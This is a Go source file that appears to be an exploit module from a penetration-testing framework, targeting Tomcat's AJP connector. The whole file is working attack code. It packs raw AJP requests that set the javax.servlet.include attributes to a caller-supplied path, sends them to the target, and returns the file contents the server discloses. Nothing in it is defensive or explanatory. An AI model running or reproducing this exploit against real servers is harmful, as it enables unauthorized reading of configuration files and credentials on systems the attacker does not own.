package exp_Tomcat

import (
	"bytes"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type Exp_Ajp_lfi struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Ajp_lfi) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	// 构造payload
	if regexp.MustCompile(`(?i)^http`).MatchString(self.Params.BaseParam.Target) {
		expResult.Result = "please use AJP protocol."
		return
	}
	if !regexp.MustCompile(`(?i)^ajp`).MatchString(self.Params.BaseParam.Target) {
		self.Params.BaseParam.Target = "ajp://" + self.Params.BaseParam.Target
	}
	targetUrl, err := url.Parse(self.Params.BaseParam.Target)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	// 解析URL

	uri := targetUrl.Path
	host := targetUrl.Host
	tmpSlice := strings.Split(host, ":")
	ip := ""
	port := 0
	if len(tmpSlice) < 2 {
		ip = tmpSlice[0]
		port = 80
	} else {
		ip = tmpSlice[0]
		port, _ = strconv.Atoi(tmpSlice[1])
	}

	// 初始化tomcat AJP请求。
	t := Tomcat{
		targetHost: ip,
		targetPort: port,
		Charset:    self.Params.Settings.Charset,
		Timeout:    time.Duration(self.Params.Settings.Timeout) * time.Millisecond,
	}
	attribute := []map[string]interface{}{
		{"name": "req_attribute", "value": []string{"javax.servlet.include.request_uri", "/"}},
		{"name": "req_attribute", "value": []string{"javax.servlet.include.path_info", cmd}},
		{"name": "req_attribute", "value": []string{"javax.servlet.include.servlet_path", "/"}},
	}
	resps, err := t.performRequest(uri, nil, "GET", "", "", attribute)
	if err != nil {
		expResult.Err = err.Error()
		return
	}

	if len(resps) < 1 {
		expResult.Result = "no data"
		return
	}
	for _, v := range resps {
		expResult.Result += v.data
	}
	expResult.Result = strings.ReplaceAll(expResult.Result, "\x00", "")
	return

}

func init() {
	exp_register.ExpStructRegister(&Exp_Ajp_lfi{}, "exp_Ajp_lfi.yml")

}

// ############################AJP###########################

type REQ_METHOD int

const (
	OPTIONS = iota + 1
	GET
	HEAD
	POST
	PUT
	DELETE
	TRACE
	PROPFIND
	PROPPATCH
	MKCOL
	COPY
	MOVE
	LOCK
	UNLOCK
	ACL
	REPORT
	VERSION_CONTROL
	CHECKIN
	CHECKOUT
	UNCHECKOUT
	SEARCH
	MKWORKSPACE
	UPDATE
	LABEL
	MERGE
	BASELINE_CONTROL
	MKACTIVITY
)

type RESP_PARAM int

const (
	SEND_BODY_CHUNK = iota + 3
	SEND_HEADERS
	END_RESPONSE
	GET_BODY_CHUNK
)

var (
	REQUEST_METHODS = map[string]REQ_METHOD{
		"GET":     GET,
		"POST":    POST,
		"HEAD":    HEAD,
		"OPTIONS": OPTIONS,
		"PUT":     PUT,
		"DELETE":  DELETE,
		"TRACE":   TRACE,
	}
	COMMON_HEADERS = []string{"SC_REQ_ACCEPT",
		"SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",
		"SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
		"SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"}
	ATTRIBUTES          = []string{"context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"}
	SERVER_TO_CONTAINER = 0
	CONTAINER_TO_SERVER = 1

	COMMON_SEND_HEADERS = []string{
		"Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
		"Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"}
)

// 序列化字符串
func packString(s string) []byte {
	if s == "" {
		return []byte{0xff, 0xff}
	}
	l := len(s)
	lb, _ := goutils.IntToBytes(int64(l), 2, true)
	return bytes.Join([][]byte{lb, []byte(s), []byte{0x00}}, []byte(""))
}

// 将数据流里的字节转换成整数
func unpack(stream *[]byte, b byte, bigEndian bool) int {
	res, _ := goutils.BytesToInt((*stream)[:b], false, bigEndian)
	*stream = (*stream)[b:]
	return res
}

// 将数据流里的字符串提取出来
// 每个字符串的结构为，len(2 bytes) + data + \x00
func unpackString(stream *[]byte) string {
	size, _ := goutils.BytesToInt((*stream)[:2], true, true)
	*stream = (*stream)[2:]
	if size == -1 {
		return ""
	}
	res := string((*stream)[:size])
	*stream = (*stream)[size+1:]
	return res

}

// 完整读取返回数据，当检测到尾部特征时返回，否则等待超时
func read2(conn net.Conn, timeout time.Duration) ([]byte, error) {
	bufall := make([]byte, 0)
	buf := make([]byte, 512)
	defer conn.SetReadDeadline(time.Time{})
	var count int
	var err error
	for {
		conn.SetReadDeadline(time.Now().Add(timeout))
		count, err = conn.Read(buf)
		if err != nil {
			break
		}
		bufall = append(bufall, buf[:count]...)
		if count >= 4 {
			if bytes.HasSuffix(buf[:count], []byte{0x00, 0x02, 0x05, 0x01}) {
				break
			}
		}
		//if count < 512 { break }
	}
	// use buf...
	return bufall, err
}

/* -----------------------------------AJP发送结构体--------------------------------- */
type AjpForwardRequest struct {
	prefixCode     int
	method         REQ_METHOD
	protocol       string
	reqUri         string
	remoteAddr     string
	remoteHost     string
	serverName     string
	serverPort     int
	isSsl          bool
	numHeaders     int
	requestHeaders map[string]string
	attributes     []map[string]interface{}
	dataDirection  int
	charSet        string
	timeout        time.Duration
}

func (self *AjpForwardRequest) Init() {
	self.prefixCode = 0x02
}

// 对请求包头部进行序列化
func (self *AjpForwardRequest) packHeaders() []byte {
	self.numHeaders = len(self.requestHeaders)
	res := make([]byte, 0)
	res, _ = goutils.IntToBytes(int64(self.numHeaders), 2, true)
	for hName, _ := range self.requestHeaders {
		if strings.HasPrefix(hName, "SC_REQ") {
			for i := 0; i < len(COMMON_HEADERS); i++ {
				if COMMON_HEADERS[i] == hName {
					code := i + 1
					tmpBytes, _ := goutils.IntToBytes(int64(code), 1, false)
					res = bytes.Join([][]byte{res, []byte{0xA0}, tmpBytes}, []byte(""))
					break
				}
			}
		} else {
			res = append(res, packString(hName)...)
		}
		res = append(res, packString(self.requestHeaders[hName])...)
	}
	return res
}

// 对属性进行序列化
func (self *AjpForwardRequest) packAttributes() []byte {
	res := make([]byte, 0)
	for _, attr := range self.attributes {
		aName := attr["name"].(string)
		for i := 0; i < len(ATTRIBUTES); i++ {
			if ATTRIBUTES[i] == aName {
				code := i + 1
				res = append(res, []byte{byte(code)}...)
				break
			}
		}
		if aName == "req_attribute" {
			aaName := attr["value"].([]string)[0]
			aValue := attr["value"].([]string)[1]
			res = append(res, packString(aaName)...)
			res = append(res, packString(aValue)...)
		} else {
			res = append(res, attr["value"].(string)...)
		}
	}

	res = append(res, []byte{0xff}...)
	return res
}

// 对数据进行序列化处理
func (self *AjpForwardRequest) serialize() []byte {
	res := make([]byte, 0)
	res = []byte{byte(self.prefixCode), byte(self.method)}
	res = append(res, packString(self.protocol)...)
	res = append(res, packString(self.reqUri)...)
	res = append(res, packString(self.remoteAddr)...)
	res = append(res, packString(self.remoteHost)...)
	res = append(res, packString(self.serverName)...)
	tmpBytes, _ := goutils.IntToBytes(int64(self.serverPort), 2, true)
	res = append(res, tmpBytes...)
	if self.isSsl {
		res = append(res, []byte{1}...)
	} else {
		res = append(res, []byte{0}...)
	}
	res = append(res, self.packHeaders()...)
	res = append(res, self.packAttributes()...)
	header := make([]byte, 0)
	if self.dataDirection == SERVER_TO_CONTAINER {
		tmpBytes, _ = goutils.IntToBytes(int64(len(res)), 2, true)
		header = append([]byte{0x12, 0x34}, tmpBytes...)
	} else {
		tmpBytes, _ = goutils.IntToBytes(int64(len(res)), 2, true)
		header = append([]byte{0x34, 0x12}, tmpBytes...)
	}
	return append(header, res...)

}

// 发送和接收ajp数据
// 接收参数：
//
//	conn: TCP连接对象，saveCookie：判断是否存储放回的Cookie字段
//
// 返回参数： res: AjpResponse切片，由于返回数据可能由多个相同结构的AJP组成，所以会分段处理
func (self *AjpForwardRequest) sendAndReceive(conn net.Conn, saveCookie bool) (res []AjpResponse, err error) {
	stream := new([]byte)
	*stream = make([]byte, 0)
	res = make([]AjpResponse, 0)
	conn.Write(self.serialize())
	//conn.Read()
	if self.method == POST {
		return res, nil
	}
	*stream, err = read2(conn, self.timeout)
	if err != nil && len(*stream) == 0 {
		return
	}
	r := receive(stream, self.charSet)
	res = append(res, r)
	if saveCookie {
		if _, ok := r.responseHeaders["Set-Cookie"]; ok {

		}
	}
	//	read body chunks and end response packets
loop:
	for {
		r := receive(stream, self.charSet)
		res = append(res, r)
		switch r.prefixCode {
		case END_RESPONSE:
			break loop
		case SEND_HEADERS:
		default:
			fmt.Println("receive error")
			break loop
		}

	}
	return res, nil
}

/* ------------------------ajp接收结构体----------------------------- */
type AjpResponse struct {
	magic           int
	dataLength      int
	prefixCode      int
	httpStatusCode  int
	httpStatusMsg   string
	numHeaders      int
	responseHeaders map[string]string
	data            string
	reuse           int
	charSet         string
}

// 对接收数据进行解析
func (self *AjpResponse) parse(stream *[]byte) {
	self.magic = unpack(stream, 2, true)
	self.dataLength = unpack(stream, 2, true)
	self.prefixCode = unpack(stream, 1, true)
	switch self.prefixCode {
	case SEND_HEADERS:
		self.parseSendHeaders(stream)
	case SEND_BODY_CHUNK:
		self.parseSendBodyChunk(stream)
	case END_RESPONSE:
		self.parseEndResponse(stream)
	case GET_BODY_CHUNK:
		self.parseGetBodyChunck(stream)

	}

}

// 解析返回头部
func (self *AjpResponse) parseSendHeaders(stream *[]byte) {
	self.httpStatusCode = unpack(stream, 2, true)
	self.httpStatusMsg = unpackString(stream)
	self.numHeaders = unpack(stream, 2, true)
	self.responseHeaders = make(map[string]string)
	var code int
	var hName string
	var hValue string
	for i := 0; i < self.numHeaders; i++ {
		code = unpack(stream, 2, true)
		if code <= 0xA000 {
			hName = string((*stream)[:code])
			*stream = (*stream)[code+1:]
			hValue = unpackString(stream)
		} else {
			hName = COMMON_SEND_HEADERS[code-0xA001]
			hValue = unpackString(stream)
		}
		self.responseHeaders[hName] = hValue
	}

}

// 解析返回body
func (self *AjpResponse) parseSendBodyChunk(stream *[]byte) {
	self.dataLength = unpack(stream, 2, true)
	if len(*stream) < self.dataLength+2 {
		self.dataLength = len(*stream) - 2
	}
	self.data = string((*stream)[:self.dataLength+1])
	if self.charSet == "GBK" {
		self.data = goutils.GBKToUTF8(self.data)
	}

	*stream = (*stream)[self.dataLength+1:]
}

// 解析应答尾部
func (self *AjpResponse) parseEndResponse(stream *[]byte) {
	self.reuse = unpack(stream, 1, false)
}

func (self *AjpResponse) parseGetBodyChunck(stream *[]byte) int {
	return unpack(stream, 2, true)

}

// 开始解析数据
func receive(stream *[]byte, charSet string) AjpResponse {
	r := AjpResponse{}
	r.charSet = charSet
	r.parse(stream)
	return r
}

/* ------------------Tomcat 发送AJP准备-------------------*/
// 初始化AJP请求数据结构
func prepareAjpForwardRequest(targetHost, reqUri string, method REQ_METHOD, charSet string, timeout time.Duration) AjpForwardRequest {
	fr := AjpForwardRequest{dataDirection: SERVER_TO_CONTAINER}
	fr.Init()
	fr.method = method
	fr.protocol = "HTTP/1.1"
	fr.reqUri = reqUri
	fr.remoteAddr = targetHost
	fr.remoteHost = ""
	fr.serverName = targetHost
	fr.serverPort = 80
	fr.requestHeaders = map[string]string{
		"SC_REQ_ACCEPT":             "text/html",
		"SC_REQ_CONNECTION":         "keep-alive",
		"SC_REQ_CONTENT_LENGTH":     "0",
		"SC_REQ_HOST":               targetHost,
		"SC_REQ_USER_AGENT":         "Mozilla",
		"Accept-Encoding":           "gzip, deflate, sdch",
		"Accept-Language":           "en-US,en;q=0.5",
		"Upgrade-Insecure-Requests": "1",
		"Cache-Control":             "max-age=0",
	}
	fr.charSet = charSet
	fr.timeout = timeout
	fr.isSsl = false
	fr.attributes = make([]map[string]interface{}, 0)
	return fr
}

// tomcat数据结构
type Tomcat struct {
	targetHost string
	targetPort int
	Charset    string
	Timeout    time.Duration
}

// 准备发送数据，进行预处理
func (self *Tomcat) performRequest(reqUri string, headers map[string]string, method, user, password string, attribute []map[string]interface{}) (resp []AjpResponse, err error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", self.targetHost, self.targetPort), self.Timeout)
	if err != nil {
		return
	}
	forwardRequest := prepareAjpForwardRequest(self.targetHost, reqUri, REQUEST_METHODS[method], self.Charset, self.Timeout)
	if user != "" && password != "" {
		forwardRequest.requestHeaders["SC_REQ_AUTHORIZATION"] = "Basic " + fmt.Sprintf("%s:%s", user, password)
	}
	for k, v := range headers {
		forwardRequest.requestHeaders[k] = v
	}
	forwardRequest.attributes = attribute
	responses, err := forwardRequest.sendAndReceive(conn, false)
	if err != nil || len(responses) < 2 {
		return
	}
	return responses[1:], nil

}
